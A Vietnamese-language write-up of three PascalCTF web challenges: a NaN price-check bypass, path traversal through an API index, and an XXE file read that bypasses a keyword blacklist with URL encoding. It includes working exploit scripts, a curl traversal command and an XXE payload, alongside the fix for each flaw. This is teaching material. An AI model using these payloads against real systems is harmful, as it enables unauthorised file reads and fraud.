# Web Challenges Writeups - PascalCTF

## 1. ZazaStore

> *We dont take any responsibility in any damage that our product may cause to the user's health*
>
> https://zazastore.ctf.pascalctf.it

### Đề cho gì?

Đề bài cho một website bán hàng với 4 sản phẩm: FakeZa ($1), ElectricZa ($65), CartoonZa ($35) và RealZa ($1000). Flag được lưu trong sản phẩm RealZa, tuy nhiên khi đăng nhập người dùng chỉ được cấp 100$ balance - không đủ để mua RealZa.

Source code được cung cấp trong file `server.js`:

```javascript
const content = {
    "RealZa": process.env.FLAG,
    "FakeZa": "pascalCTF{this_is_a_fake_flag_like_the_fake_za}",
    "ElectricZa": "<img src='images/ElectricZa.jpeg' alt='Electric Za'>",
    "CartoonZa": "<img src='images/CartoonZa.png' alt='Cartoon Za'>"
};
const prices = { "FakeZa": 1, "ElectricZa": 65, "CartoonZa": 35, "RealZa": 1000 };

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    if (username && password) {
        req.session.user = true;
        req.session.balance = 100;  // Chỉ có 100$
        req.session.inventory = {};
        req.session.cart = {};
        return res.json({ success: true });
    }
});
```

### Nhận xét gì?

Phân tích endpoint `/checkout`, ta thấy cách tính tổng tiền giỏ hàng như sau:

```javascript
app.post('/checkout', (req, res) => {
    const inventory = req.session.inventory;
    const cart = req.session.cart;

    let total = 0;
    for (const product in cart) {
        total += prices[product] * cart[product];
    }

    if (total > req.session.balance) {
        res.json({ "success": true, "balance": "Insufficient Balance" });
    } else {
        req.session.balance -= total;
        for (const property in cart) {
            if (inventory.hasOwnProperty(property)) {
                inventory[property] += cart[property];
            } else {
                inventory[property] = cart[property];
            }
        }
        req.session.cart = {};
        req.session.inventory = inventory;
        res.json({ "success": true });
    }
});
```

Điểm quan trọng ở đây là code không validate xem product có tồn tại trong object `prices` hay không. Nếu ta thêm một sản phẩm không tồn tại vào giỏ hàng, `prices["nonexistent"]` sẽ trả về `undefined`. Trong JavaScript, `undefined * number = NaN`, và `NaN + number = NaN`. Cuối cùng, điều kiện `NaN > 100` sẽ trả về `false`, cho phép checkout thành công mà không cần đủ tiền.

### Hướng giải

Khai thác lỗ hổng NaN bypass bằng cách thêm một sản phẩm fake vào giỏ hàng trước khi thêm RealZa:

```python
import requests

s = requests.Session()
BASE_URL = "https://zazastore.ctf.pascalctf.it"

s.post(f"{BASE_URL}/login", data={"username": "test", "password": "test"})
s.post(f"{BASE_URL}/add-cart", json={"product": "nonexistent", "quantity": 1})
s.post(f"{BASE_URL}/add-cart", json={"product": "RealZa", "quantity": 1})
s.post(f"{BASE_URL}/checkout")
r = s.get(f"{BASE_URL}/inventory")
print(r.text)  # Flag trong inventory
```

### Kết luận

Lỗi ở đây là **NaN Type Confusion**. Nguyên nhân do không validate product có tồn tại trong price list trước khi tính toán. Cách khắc phục là thêm kiểm tra `if (!(product in prices)) return error;` trước khi tính tổng.

**Flag:** `pascalCTF{w3_l1v3_f0r_th3_z4z4}`

---

## 2. Travel Playlist

> *Nel mezzo del cammin di nostra vita*
> *mi ritrovai per una selva oscura,*
> *ché la diritta via era smarrita.*
> *The flag can be found here /app/flag.txt*
>
> https://travel.ctf.pascalctf.it

### Đề cho gì?

Đề bài cho một website "Travel Playlist" hiển thị các bài hát theo trang từ 1 đến 7. Có một hint thú vị từ Dante's Inferno: "Nel mezzo del cammin di nostra vita, mi ritrovai per una selva oscura, ché la diritta via era smarrita" (Giữa đường đời, tôi lạc vào rừng tối, con đường thẳng đã mất). Flag nằm tại `/app/flag.txt`.

Phân tích JavaScript trong trang web:

```javascript
const index = 1;
await fetch('/api/get_json', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ index: index })
})
.then(response => response.json())
.then(data => {
    document.getElementById('song-name').textContent = data.name;
    // ...
});
```

### Nhận xét gì?

Website sử dụng API `/api/get_json` với parameter `index` để đọc file JSON. Backend có thể đang sử dụng pattern như `songs/{index}.json` để đọc file. Hint về "con đường thẳng đã mất" gợi ý đến lỗi Path Traversal - việc "đi lạc" khỏi thư mục cho phép.

### Hướng giải

Thử path traversal trực tiếp qua API parameter bằng cách gửi `../flag.txt` thay vì số trang:

```bash
curl -s "https://travel.ctf.pascalctf.it/api/get_json" \
     -H "Content-Type: application/json" \
     -d '{"index": "../flag.txt"}'
```

API trả về ngay nội dung flag vì backend không sanitize input, cho phép đọc file bất kỳ bên ngoài thư mục songs.

### Kết luận

Lỗi ở đây là **Path Traversal (LFI - Local File Inclusion)**. Nguyên nhân do không sanitize input `index`, cho phép sử dụng `../` để traverse lên thư mục cha. Cách khắc phục bao gồm: validate index phải là số nguyên, sử dụng `path.basename()` để loại bỏ path components, hoặc whitelist các file được phép đọc.

**Flag:** `pascalCTF{4ll_1_d0_1s_tr4v3ll1nG_4r0und_th3_w0rld}`

---

## 3. PDFile (XML to PDF)

> *I've recently developed a XML to PDF utility, I'll probably add payments to it soon!*
>
> https://pdfile.ctf.pascalctf.it

### Đề cho gì?

Đề bài cho một website chuyển đổi file XML (định dạng .pasx) sang PDF. Flag nằm tại `/app/flag.txt`. Source code `app.py` được cung cấp với cấu hình XML parser và một blacklist filter:

```python
def sanitize(xml_content):
    try:
        content_str = xml_content.decode('utf-8')
    except UnicodeDecodeError:
        return False
    
    if "&#" in content_str:
        return False
    
    blacklist = [
        "flag", "etc", "sh", "bash", 
        "proc", "pascal", "tmp", "env", 
        "bash", "exec", "file",
    ]
    if any(a in content_str.lower() for a in blacklist):
        return False
    return True


def parse_pasx(xml_content):
    if not sanitize(xml_content):
        raise ValueError("XML content contains disallowed keywords.")
    
    parser = etree.XMLParser(
        encoding='utf-8', 
        no_network=False,        # Cho phép network request
        resolve_entities=True,   # XXE enabled!
        recover=True
    )
    root = etree.fromstring(xml_content, parser=parser)
    # ... parse book data
```

### Nhận xét gì?

Có hai điểm quan trọng cần chú ý. Thứ nhất, XML parser được cấu hình với `resolve_entities=True` và `no_network=False`, nghĩa là XXE (XML External Entity) injection được enable. Thứ hai, blacklist filter chạy TRƯỚC khi parse XML và chỉ check trên raw string, không check sau khi URL decode.

Vấn đề là ta không thể dùng trực tiếp `file:///app/flag.txt` vì cả "file" và "flag" đều bị block. Tuy nhiên, lxml parser sẽ URL decode path khi resolve entity, nên ta có thể bypass bằng cách encode một phần của path.

### Hướng giải

Bypass blacklist bằng cách: bỏ scheme `file://` (dùng path trực tiếp), và URL encode ký tự 'g' thành `%67` để "flag" trở thành "fla%67":

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE book [
  <!ENTITY xxe SYSTEM "/app/fla%67.txt">
]>
<book>
  <title>&xxe;</title>
  <author>Test</author>
  <year>2024</year>
  <isbn>123</isbn>
  <chapters>
    <chapter number="1">
      <title>Chapter</title>
      <content>Content</content>
    </chapter>
  </chapters>
</book>
```

Khi parser resolve entity `&xxe;`, nó sẽ URL decode `/app/fla%67.txt` thành `/app/flag.txt` và đọc nội dung file, sau đó chèn vào thẻ `<title>`. Flag sẽ xuất hiện trong response JSON ở field `book_title`.

```python
import requests

pasx_payload = b'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE book [
  <!ENTITY xxe SYSTEM "/app/fla%67.txt">
]>
<book>
  <title>&xxe;</title>
  <author>Test</author>
  <year>2024</year>
  <isbn>123</isbn>
  <chapters>
    <chapter number="1">
      <title>Ch1</title>
      <content>Content</content>
    </chapter>
  </chapters>
</book>'''

files = {'file': ('exploit.pasx', pasx_payload, 'application/xml')}
r = requests.post("https://pdfile.ctf.pascalctf.it/upload", files=files)
print(r.json())  # {"book_title": "pascalCTF{...}", ...}
```

### Kết luận

Lỗi ở đây là **XXE (XML External Entity) Injection** kết hợp với **Blacklist Bypass**. Nguyên nhân do enable `resolve_entities=True` trong XML parser và blacklist filter không đủ mạnh - có thể bypass bằng URL encoding. Cách khắc phục bao gồm: disable external entities với `resolve_entities=False`, set `no_network=True`, và sử dụng thư viện defusedxml thay vì lxml trực tiếp.

**Flag:** `pascalCTF{xml_t0_pdf_1s_th3_n3xt_b1g_th1ng}`

---

## Tổng kết

| Challenge | Vulnerability | Bypass Technique |
|-----------|--------------|------------------|
| ZazaStore | NaN Type Confusion | Undefined * number = NaN, NaN > number = false |
| Travel | Path Traversal (LFI) | `../` trong API parameter |
| PDFile | XXE Injection | URL encoding để bypass blacklist |

Ba bài này thể hiện các lỗi web phổ biến: thiếu validation input dẫn đến type confusion, thiếu sanitization path dẫn đến LFI, và unsafe XML parsing dẫn đến XXE. Đặc biệt, bài PDFile cho thấy blacklist-based filtering luôn có thể bị bypass bằng các kỹ thuật encoding khác nhau - whitelist luôn an toàn hơn.
